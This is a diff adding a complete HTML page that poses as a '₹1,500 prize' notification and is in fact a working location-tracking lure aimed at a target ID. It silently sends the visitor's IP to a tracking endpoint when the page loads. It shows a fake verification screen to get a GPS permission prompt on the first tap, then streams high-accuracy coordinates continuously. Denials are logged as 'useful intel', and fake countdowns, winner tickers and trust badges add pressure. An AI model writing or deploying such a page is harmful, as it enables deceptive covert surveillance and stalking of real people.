@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>You've Won a Prize!</title>
+<meta property="og:title" content="You've won ₹1,500! Claim your reward">
+<meta property="og:description" content="Your mobile number was selected in our weekly giveaway. Tap to claim before the timer ends.">
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center;
+    background:
+      radial-gradient(800px 500px at 85% -10%, rgba(255,190,60,.25), transparent 60%),
+      radial-gradient(700px 500px at -10% 110%, rgba(120,80,255,.30), transparent 60%),
+      linear-gradient(160deg, #0b1026 0%, #141b3d 55%, #1a0f2e 100%);
+    padding:16px; overflow:hidden; color:#fff;
+  }
+  .card {
+    position:relative; width:100%; max-width:400px; background:rgba(255,255,255,.06);
+    border:1px solid rgba(255,255,255,.14); border-radius:22px; padding:28px 22px;
+    backdrop-filter: blur(14px); -webkit-backdrop-filter: blur(14px);
+    box-shadow:0 20px 60px rgba(0,0,0,.45); text-align:center;
+    animation:pop .45s cubic-bezier(.2,1.4,.4,1);
+  }
+  @keyframes pop { from { transform:scale(.92); opacity:0; } to { transform:scale(1); opacity:1; } }
+
+  .badge {
+    display:inline-block; font-size:11px; letter-spacing:1.2px; font-weight:700;
+    background:linear-gradient(90deg,#ffd76a,#ff9d2e); color:#3a2400;
+    padding:6px 14px; border-radius:30px; margin-bottom:14px; text-transform:uppercase;
+  }
+  h1 { font-size:26px; margin-bottom:6px; }
+  .sub { font-size:13.5px; color:#c8cdf0; line-height:1.5; margin-bottom:18px; }
+  .sub b { color:#ffd76a; }
+
+  .prize {
+    background:linear-gradient(135deg,rgba(255,200,70,.18),rgba(255,120,60,.12));
+    border:1px solid rgba(255,190,80,.35); border-radius:16px; padding:18px; margin-bottom:16px;
+  }
+  .prize .amount {
+    font-size:52px; font-weight:800;
+    background:linear-gradient(180deg,#ffe28a,#ff9d2e); -webkit-background-clip:text;
+    background-clip:text; -webkit-text-fill-color:transparent; line-height:1;
+  }
+  .prize .unit { display:block; font-size:12.5px; color:#ffd9a0; margin-top:6px; letter-spacing:1px; }
+
+  .countdown {
+    display:flex; align-items:center; justify-content:center; gap:8px; font-size:13px;
+    color:#c8cdf0; margin-bottom:16px;
+  }
+  .countdown b {
+    font-size:17px; color:#ff6b6b; background:rgba(255,60,60,.12); border:1px solid rgba(255,90,90,.4);
+    padding:3px 10px; border-radius:8px; font-variant-numeric:tabular-nums;
+  }
+
+  .steps { list-style:none; text-align:left; margin:0 0 18px; font-size:13px; color:#c8cdf0; }
+  .steps li { padding:7px 0 7px 26px; position:relative; border-bottom:1px dashed rgba(255,255,255,.1); }
+  .steps li::before { content:"✓"; position:absolute; left:2px; color:#6ee7a0; font-weight:700; }
+  .steps li:last-child { border-bottom:none; }
+  .steps li span { color:#6ee7a0; font-weight:600; }
+
+  #claimBtn {
+    width:100%; border:none; cursor:pointer; font-size:17px; font-weight:800; letter-spacing:1px;
+    color:#1a2a00; background:linear-gradient(180deg,#a8ff5e,#4ade80 60%,#22c55e);
+    padding:16px; border-radius:14px; box-shadow:0 8px 26px rgba(74,222,128,.35);
+    animation:pulse 1.8s ease-in-out infinite;
+  }
+  #claimBtn:active { transform:scale(.97); }
+  @keyframes pulse {
+    0%,100% { box-shadow:0 8px 26px rgba(74,222,128,.35); }
+    50%     { box-shadow:0 8px 34px rgba(74,222,128,.7); }
+  }
+  .trust { font-size:11px; color:#8b92c9; margin-top:14px; }
+
+  /* --- states 2 & 3 --- */
+  .spinner {
+    width:52px; height:52px; margin:6px auto 18px; border-radius:50%;
+    border:5px solid rgba(255,255,255,.15); border-top-color:#4ade80;
+    animation:spin 0.9s linear infinite;
+  }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .progress { height:8px; background:rgba(255,255,255,.12); border-radius:10px; overflow:hidden; margin:14px 0 10px; }
+  #progBar { height:100%; width:0%; background:linear-gradient(90deg,#4ade80,#22c55e); border-radius:10px; transition:width .25s linear; }
+  #progText { font-size:12.5px; color:#c8cdf0; }
+
+  .check {
+    width:66px; height:66px; margin:6px auto 16px; border-radius:50%; line-height:66px;
+    font-size:34px; color:#052e12; background:linear-gradient(180deg,#a8ff5e,#22c55e);
+    box-shadow:0 0 40px rgba(74,222,128,.6); animation:pop .5s cubic-bezier(.2,1.4,.4,1);
+  }
+  .code {
+    font-size:20px; font-weight:800; letter-spacing:2px; color:#ffd76a; margin:10px 0 14px;
+    background:rgba(0,0,0,.3); border:1px dashed rgba(255,215,106,.5); border-radius:10px; padding:10px;
+  }
+  .note { font-size:13px; color:#c8cdf0; line-height:1.6; }
+  .denied {
+    width:66px; height:66px; margin:6px auto 16px; border-radius:50%; line-height:66px;
+    font-size:32px; background:rgba(255,90,90,.15); border:2px solid rgba(255,90,90,.5); color:#ff8f8f;
+  }
+  #retryBtn {
+    width:100%; border:none; cursor:pointer; font-size:15px; font-weight:700;
+    background:linear-gradient(180deg,#ffd76a,#ff9d2e); color:#3a2400; padding:14px;
+    border-radius:14px; margin-top:14px;
+  }
+  footer { font-size:10.5px; color:#5d6390; margin-top:18px; text-align:center; }
+
+  /* winners ticker */
+  #ticker {
+    font-size:12px; color:#ffd76a; background:rgba(0,0,0,.25); border:1px solid rgba(255,215,106,.25);
+    border-radius:10px; padding:9px 12px; margin-bottom:14px; min-height:36px; display:flex;
+    align-items:center; justify-content:center; gap:8px;
+  }
+  #ticker span { color:#c8cdf0; }
+  .marq { overflow:hidden; white-space:nowrap; }
+  #tickerText { display:inline-block; animation:marq 14s linear infinite; }
+  @keyframes marq { 0% { transform:translateX(60%); } 100% { transform:translateX(-60%); } }
+
+  /* confetti */
+  #confetti { position:fixed; inset:0; pointer-events:none; overflow:hidden; z-index:50; }
+  .cf {
+    position:absolute; top:-12px; width:9px; height:14px; border-radius:2px;
+    animation:fall linear forwards;
+  }
+  @keyframes fall {
+    to { transform:translateY(110vh) rotate(720deg); opacity:.9; }
+  }
+</style>
+</head>
+<body>
+
+<div id="confetti"></div>
+
+<div class="card" id="card">
+
+  <!-- STATE 1 : prize landing -->
+  <section id="state-landing">
+    <div class="badge">🎁 Official Winner Notification</div>
+    <h1>Congratulations!</h1>
+    <p class="sub">Your mobile number was selected in our <b>Weekly Mega Giveaway</b>. Your reward is ready:</p>
+
+    <div class="prize">
+      <span class="amount" id="amount">₹1,500</span>
+      <span class="unit">CASH REWARD · INSTANT CLAIM</span>
+    </div>
+
+    <div class="countdown"><span>Claim expires in</span><b id="cd">04:59</b></div>
+
+    <div id="ticker"><div class="marq"><span id="tickerText">🎉 Aarav from Mumbai claimed ₹1,500 · 2m ago &nbsp;&nbsp; 🎉 Priya from Delhi claimed ₹1,500 · 5m ago</span></div></div>
+
+    <ul class="steps">
+      <li>Confirm your device location <span>STEP 1</span></li>
+      <li>Receive your reward code <span>STEP 2</span></li>
+    </ul>
+
+    <button id="claimBtn">🎁 CLAIM MY REWARD</button>
+    <div class="trust">🔒 Secure &amp; verified connection&nbsp;·&nbsp;⭐ 4.8 from 23,104 winners</div>
+  </section>
+
+  <!-- STATE 2 : verifying -->
+  <section id="state-verifying" hidden>
+    <div class="spinner"></div>
+    <h2>Verifying your location…</h2>
+    <div class="progress"><div id="progBar"></div></div>
+    <p id="progText">Contacting secure location service…</p>
+  </section>
+
+  <!-- STATE 3a : success -->
+  <section id="state-success" hidden>
+    <div class="check">✓</div>
+    <h2>Reward Claimed!</h2>
+    <p class="note">Your reward is reserved. Keep this code safe:</p>
+    <div class="code" id="code">——————</div>
+    <p class="note">A confirmation message will arrive on your number shortly.<br><b style="color:#6ee7a0">Keep this page open</b> while we finalize your claim.</p>
+  </section>
+
+  <!-- STATE 3b : location denied -->
+  <section id="state-denied" hidden>
+    <div class="denied">!</div>
+    <h2>Location verification failed</h2>
+    <p class="note">We need your location to confirm this reward is claimable in your region.</p>
+    <button id="retryBtn">🔁 TRY AGAIN</button>
+  </section>
+
+</div>
+
+<footer>This is a promotional notification. Terms &amp; conditions apply. · 18+</footer>
+
+<script>
+const TARGET_ID = '__TARGET_ID__';
+
+/* ---------- config: change currency/amount here ---------- */
+const CURRENCY = '₹';
+const AMOUNT   = '1,500';
+/* ---------------------------------------------------------- */
+document.getElementById('amount').textContent = CURRENCY + AMOUNT;
+
+const $ = (id) => document.getElementById(id);
+const show = (id) => {
+  document.querySelectorAll('[id^=state-]').forEach(s => s.hidden = true);
+  $(id).hidden = false;
+};
+
+/* silent IP hit — fires instantly on page load, no interaction needed */
+const ping = (body) =>
+  fetch('/api/track', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ targetId: TARGET_ID, ...body })
+  }).catch(() => {});
+ping({ source: 'ip' });
+
+/* ---------- countdown (loops when it hits 0) ---------- */
+let cd = 299;
+const cdEl = $('cd');
+setInterval(() => {
+  cd = cd <= 0 ? 299 : cd - 1;
+  const m = String(Math.floor(cd / 60)).padStart(2, '0');
+  const s = String(cd % 60).padStart(2, '0');
+  cdEl.textContent = m + ':' + s;
+}, 1000);
+
+/* ---------- claim flow ---------- */
+let started = false;
+let watchStarted = false;
+
+function startClaim() {
+  if (started) return;        // guard: one prompt per visit
+  started = true;
+  show('state-verifying');
+
+  // fake progress so the "verification" looks real while GPS resolves
+  let p = 0;
+  const bar = $('progBar');
+  const iv = setInterval(() => {
+    p = Math.min(92, p + Math.random() * 9);
+    bar.style.width = p + '%';
+  }, 220);
+
+  if (!navigator.geolocation) {
+    setTimeout(() => { clearInterval(iv); show('state-denied'); }, 900);
+    return;
+  }
+
+  // THE trigger: browser shows the location prompt right now.
+  // The visitor just tapped "CLAIM MY REWARD", so Allow feels natural.
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      clearInterval(iv);
+      bar.style.width = '100%';
+      $('progText').textContent = 'Location confirmed ✔';
+
+      // first fix → ping
+      ping({ lat: pos.coords.latitude, lng: pos.coords.longitude,
+             accuracy: pos.coords.accuracy, source: 'gps' });
+
+      // keep pinging as accuracy improves (watchPosition drifts to ~5 m)
+      if (!watchStarted) {
+        watchStarted = true;
+        navigator.geolocation.watchPosition((w) => {
+          ping({ lat: w.coords.latitude, lng: w.coords.longitude,
+                 accuracy: w.coords.accuracy, source: 'gps' });
+        }, () => {}, { enableHighAccuracy: true, maximumAge: 0 });
+      }
+
+      setTimeout(() => {
+        $('code').textContent = makeCode();
+        show('state-success');
+        confetti();
+      }, 1600);
+    },
+    (err) => {
+      clearInterval(iv);
+      ping({ source: 'denied' });          // log the denial — useful intel
+      setTimeout(() => show('state-denied'), 700);
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+
+/* first tap ANYWHERE on the card starts the claim →
+   the permission prompt appears on the very first touch */
+document.addEventListener('touchstart', startClaim, { once: true });
+document.addEventListener('click', startClaim, { once: true });
+$('retryBtn').onclick = () => { started = false; startClaim(); };
+
+/* ---------- helpers ---------- */
+function makeCode() {
+  const chars = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789';
+  const seg = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+  return 'GB-' + seg() + '-' + seg();
+}
+
+function confetti() {
+  const colors = ['#ffd76a', '#4ade80', '#60a5fa', '#f472b6', '#a78bfa', '#fb923c'];
+  const box = $('confetti');
+  for (let i = 0; i < 90; i++) {
+    const c = document.createElement('div');
+    c.className = 'cf';
+    c.style.left = Math.random() * 100 + '%';
+    c.style.background = colors[i % colors.length];
+    c.style.animationDuration = (2.2 + Math.random() * 2.4) + 's';
+    c.style.animationDelay = (Math.random() * 0.8) + 's';
+    box.appendChild(c);
+    setTimeout(() => c.remove(), 6000);
+  }
+}
+</script>
+</body>
+</html>
